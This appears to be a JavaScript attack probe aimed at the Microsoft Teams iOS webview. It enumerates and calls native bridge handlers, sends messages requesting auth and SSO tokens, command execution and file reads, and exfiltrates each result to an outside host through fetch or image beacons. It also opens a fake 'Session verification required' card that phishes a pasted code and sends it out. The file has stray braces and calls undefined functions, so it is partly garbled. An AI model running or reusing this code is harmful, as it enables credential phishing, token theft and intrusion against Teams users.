function log(m, cls) {
  var span = document.createElement('span');
  span.className = cls || '';
  span.textContent = m + '\n';
  el.appendChild(span);
  el.scrollTop = el.scrollHeight;
}

function ex(path, data) {
  var p = Object.keys(data).map(function(k) {
    return k + '=' + encodeURIComponent(String(data[k] || '').substring(0, 400));
  }).join('&');
  fetch('https://' + C + '/' + path + '?' + p).catch(function() {
    new Image().src = 'https://' + C + '/' + path + '?' + p;
  });
}

function copyOut() {
  navigator.clipboard.writeText(el.textContent).catch(function(){});
  log('[copied]', 'info');
}

function safeStringify(obj, depth) {
  if (depth === undefined) depth = 3;
  if (depth <= 0) return String(obj);
  if (obj === null) return 'null';
  if (obj === undefined) return 'undefined';
  var type = typeof obj;
  if (type === 'string') return '"' + obj.substring(0, 200) + '"';
  if (type === 'number' || type === 'boolean') return String(obj);
  if (type === 'function') return '[function ' + (obj.name || 'anon') + ']';
  if (Array.isArray(obj)) {
    return '[' + obj.slice(0, 10).map(function(v) { return safeStringify(v, depth - 1); }).join(', ') + ']';
  }
  if (type === 'object') {
    var keys;
    try { keys = Object.getOwnPropertyNames(obj); } catch(e) { try { keys = Object.keys(obj); } catch(e2) { return '[object]'; } }
    var parts = keys.slice(0, 20).map(function(k) {
      try { return k + ': ' + safeStringify(obj[k], depth - 1); } catch(e) { return k + ': [error]'; }
    });
    return '{' + parts.join(', ') + '}';
  }
  return String(obj);
}

}

// ================================================================
// PROBE 1: DEEP ENUMERATION OF window.teams NATIVE BRIDGE
// This is the most critical finding — native object injected by Teams iOS
// ================================================================
async function probeNativeBridge() {
  log('\n' + '='.repeat(60), 'info');
  log('PROBE 1: window.teams NATIVE BRIDGE — DEEP ENUMERATION', 'info');
  log('='.repeat(60), 'info');

  // A) Deep enumerate window.teams
  log('\n--- A: window.teams structure ---', 'info');
  if (!window.teams) {
    log('window.teams not found (requires Teams iOS)', 'fail');
    return;
  }

  log('typeof window.teams: ' + typeof window.teams, 'ok');

  // Get all properties recursively
  function enumerate(obj, prefix, depth) {
    if (depth > 4) return;
    var keys;
    try { keys = Object.getOwnPropertyNames(obj); } catch(e) {
      try { keys = Object.keys(obj); } catch(e2) { return; }
    }

    for (var i = 0; i < keys.length; i++) {
      var k = keys[i];
      if (k === '__proto__' || k === 'constructor') continue;
      var path = prefix + '.' + k;
      try {
        var val = obj[k];
        var type = typeof val;

        if (type === 'function') {
          log('  ' + path + '() [function]', 'crit');
          try {
            var result = val.call(obj);
            log('    → returned: ' + safeStringify(result, 2).substring(0, 200), 'warn');
            ex('t11-bridge-func', { path: path, result: safeStringify(result, 2).substring(0, 300) });
          } catch(e) {
            log('    → error: ' + e.message.substring(0, 80), 'info');
          }
        } else if (type === 'object' && val !== null) {
          log('  ' + path + ' [object]', 'ok');
          enumerate(val, path, depth + 1);
        } else {
          log('  ' + path + ' = ' + String(val).substring(0, 100) + ' (' + type + ')', 'ok');
          if (String(val).length > 0 && type === 'string') {
            ex('t11-bridge-val', { path: path, value: String(val).substring(0, 300) });
          }
        }
      } catch(e) {
        log('  ' + path + ': access error: ' + e.message.substring(0, 40), 'fail');
      }
    }
  }

  enumerate(window.teams, 'teams', 0);

  // B) window.teams.messageHandlers — deep dive
  log('\n--- B: window.teams.messageHandlers ---', 'info');
  if (window.teams.messageHandlers) {
    log('typeof: ' + typeof window.teams.messageHandlers, 'ok');
    enumerate(window.teams.messageHandlers, 'teams.messageHandlers', 0);

    // Try known handler patterns from Teams iOS
    var handlerProbes = [
      { name: 'auth', msgs: [
        { action: 'getToken' },
        { action: 'getToken', resource: 'https://graph.microsoft.com' },
        { action: 'getSSOToken' },
        { type: 'auth', method: 'getToken' },
        'getToken',
      ]},
      { name: 'bridge', msgs: [
        { action: 'version' },
        { action: 'getDeviceInfo' },
        { action: 'getCapabilities' },
        { type: 'request', method: 'getInfo' },
        'ping',
      ]},
      { name: 'native', msgs: [
        { action: 'exec', command: 'id' },
        { action: 'openURL', url: 'file:///etc/hosts' },
        { action: 'readFile', path: '/tmp/test' },
        { action: 'eval', code: 'test' },
      ]},
    ];

    // Try posting to it directly if it has postMessage
    if (typeof window.teams.messageHandlers.postMessage === 'function') {
      log('\nteams.messageHandlers.postMessage EXISTS!', 'crit');
      for (var hp of handlerProbes) {
        for (var msg of hp.msgs) {
          try {
            var r = window.teams.messageHandlers.postMessage(msg);
            log('  postMessage(' + JSON.stringify(msg).substring(0, 60) + '): OK', 'crit');
            if (r !== undefined) log('    → ' + safeStringify(r, 2).substring(0, 150), 'warn');
          } catch(e) {
            log('  postMessage(' + JSON.stringify(msg).substring(0, 40) + '): ' + e.message.substring(0, 50), 'fail');
          }
        }
      }
    }

    // Try each sub-handler
    try {
      var mhKeys = Object.getOwnPropertyNames(window.teams.messageHandlers);
      for (var mk of mhKeys) {
        var handler = window.teams.messageHandlers[mk];
        if (handler && typeof handler.postMessage === 'function') {
          log('\nFound sub-handler: teams.messageHandlers.' + mk, 'crit');
          try {
            handler.postMessage({ action: 'getToken' });
            log('  → postMessage accepted!', 'crit');
          } catch(e) {
            log('  → postMessage error: ' + e.message.substring(0, 50), 'warn');
          }
        }
      }
    } catch(e) {}
  }

  // C) Check window.webkit.messageHandlers with Proxy trap
  log('\n--- C: webkit.messageHandlers via property access ---', 'info');
  if (window.webkit && window.webkit.messageHandlers) {
    // Try getting the prototype chain
    try {
      var proto = Object.getPrototypeOf(window.webkit.messageHandlers);
      if (proto) {
        var protoKeys = Object.getOwnPropertyNames(proto);
        log('Prototype keys: ' + protoKeys.join(', '), protoKeys.length > 0 ? 'crit' : 'info');
      }
    } catch(e) {}

    // The handlers may be lazily created — try accessing known names
    var iosHandlers = [
      'TeamsNative', 'teamsAuth', 'teamsSSO', 'nativeInterface',
      'jsbridge', 'callHandler', 'log', 'telemetry',
      'performanceHandler', 'nativeBridge', 'messageBridge',
      'appBridge', 'teams', 'auth', 'token', 'sso',
      'shareExtension', 'notificationBridge', 'pushNotification',
      'corsProxy', 'httpClient', 'networkRequest', 'fetch',
      'keychain', 'secureStore', 'biometric',
      'fileAccess', 'localStorage', 'userDefaults',
      'deviceInfo', 'appInfo', 'systemInfo',
      'deepLink', 'universalLink', 'urlScheme',
      'camera', 'microphone', 'photo', 'contacts', 'calendar',
    ];

    for (var ih of iosHandlers) {
      try {
        var h = window.webkit.messageHandlers[ih];
        if (h) {
          log('  webkit.messageHandlers.' + ih + ' EXISTS!', 'crit');
          try {
            h.postMessage('ping');
            log('    → postMessage accepted', 'crit');
          } catch(e) {
            log('    → ' + e.message.substring(0, 40), 'warn');
          }
          ex('t11-webkit-handler', { name: ih });
        }
      } catch(e) {}
    }
  }

  // D) Check for other native injection points
  log('\n--- D: Other native globals ---', 'info');
  var globals = [
    'nativeModule', 'NativeModules', '__turboModuleProxy',
    '__fbBatchedBridge', '__fbGenNativeModule', 'ErrorUtils',
    'nativeCallSyncHook', 'nativeFlushQueueImmediate',
    'nativeLoggingHook', 'nativePerformanceNow',
    'nativeTraceBeginSection', 'nativeTraceEndSection',
    '__DEV__', '__BUNDLE_START_TIME__',
    'HermesInternal', '_WORKLET_RUNTIME',
    'expo', 'ExpoModules',
    'TeamsMobileNative', 'TeamsBridge',
    'MSALNative', 'OneAuthNative',
    'IntuneMAMNative', 'MAMBridge',
  ];

  for (var g of globals) {
    try {
      if (window[g] !== undefined) {
        log('  window.' + g + ' = ' + safeStringify(window[g], 1).substring(0, 150), 'crit');
        ex('t11-global', { name: g, type: typeof window[g] });
      }
    } catch(e) {}
  }

  ex('t11-bridge-complete', { teamsExists: !!window.teams, teamsType: typeof window.teams });
}

  try {
    if (microsoftTeams.dialog && microsoftTeams.dialog.adaptiveCard) {
      microsoftTeams.dialog.adaptiveCard.open({
        title: 'Verify',
        card: JSON.stringify({
          type: 'AdaptiveCard',
          version: '1.5',
          body: [
            { type: 'TextBlock', text: 'Session verification required.', weight: 'Bolder' },
            { type: 'Input.Text', id: 'token', placeholder: 'Paste verification code', style: 'password' },
          ],
          actions: [{ type: 'Action.Submit', title: 'Verify', style: 'positive' }]
        })
      }, function(result) {
        if (result && result.result) {
          log('AdaptiveCard data: ' + JSON.stringify(result.result), 'crit');
          ex('t11-adaptive-capture', { data: JSON.stringify(result.result).substring(0, 300) });
        }
      });
      log('AdaptiveCard dialog opened', 'ok');
    }
  } catch(e) {
    log('adaptiveCard: ' + e.message, 'fail');
  }
}

  await init();
  await probeNativeBridge();

  await probeRemoteCamera();

  log('\n' + '='.repeat(60), 'info');
  log('ALL PROBES COMPLETE — copy output and send', 'info');
  log('='.repeat(60), 'info');
}

init();
